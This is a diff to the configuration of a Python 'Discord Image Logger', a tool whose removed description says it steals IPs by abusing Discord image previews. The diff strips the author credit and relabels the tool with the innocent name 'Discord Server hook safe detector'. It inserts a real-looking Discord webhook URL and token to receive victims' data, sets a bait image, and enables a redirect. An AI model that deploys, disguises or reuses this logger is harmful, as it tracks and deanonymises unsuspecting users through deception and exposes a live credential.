@@ -1,24 +1,22 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Discord Server hook safe detector"
+__description__ = "A simple server discord check"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Константин"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1144336137331167380/dQiVxHAEtYaIA6ZFZwQrK1AH1UeouVcQQIMCSXEtgSLB0quNyvnx-bpG2pu4os_pt3bw",
+    "image": "https://w0.peakpx.com/wallpaper/45/408/HD-wallpaper-tita-bruh-titasama-egirl-thumbnail.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "dk", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +26,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "dk", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +48,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.youtube.com/watch?v=RvVdFXOFcjw" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
